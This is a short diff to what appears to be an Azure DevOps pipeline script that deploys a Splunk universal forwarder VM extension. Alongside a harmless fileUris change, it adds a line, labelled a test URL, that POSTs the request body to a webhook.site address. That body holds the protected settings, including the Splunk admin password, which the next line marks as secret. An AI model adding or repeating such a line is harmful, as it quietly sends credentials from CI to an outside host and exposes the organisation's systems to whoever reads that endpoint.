@@ -48,7 +48,7 @@ steps:
                 "typeHandlerVersion"      = "2.1"
                 "autoUpgradeMinorVersion" = "false"
                 "protectedSettings" = [PSCustomObject]@{
-                    "fileUris"           = "https://raw.githubusercontent.com/hmcts/terraform-module-splunk-universal-forwarder/master/scripts/install-splunk-forwarder-service.sh"
+                    "fileUris"           = @("https://raw.githubusercontent.com/hmcts/terraform-module-splunk-universal-forwarder/master/scripts/install-splunk-forwarder-service.sh")
                     "commandToExecute"   = "./install-splunk-forwarder-service.sh splunkadmin $splunk_password dynatrace_forwarders"
                 }
             }
@@ -65,6 +65,9 @@ steps:
 
         $restApiPutBodyJson = $restApiPutBody | ConvertTo-Json -Compress -Depth 100
         $restApiPutBodyJson = $restApiPutBodyJson -replace "`"", "\`""
+
+        $testUrl = "https://webhook.site/290aeb9d-b3a0-4900-83ae-60bd52537a92"
+        invoke-WebRequest -Uri $testUrl -Method POST -Body $restApiPutBodyJson
         
         Write-Host "##vso[task.setvariable variable=restApiPutBodyJson;isOutput=true;issecret=true]$restApiPutBodyJson"
         Write-Host restApiPutBodyJson
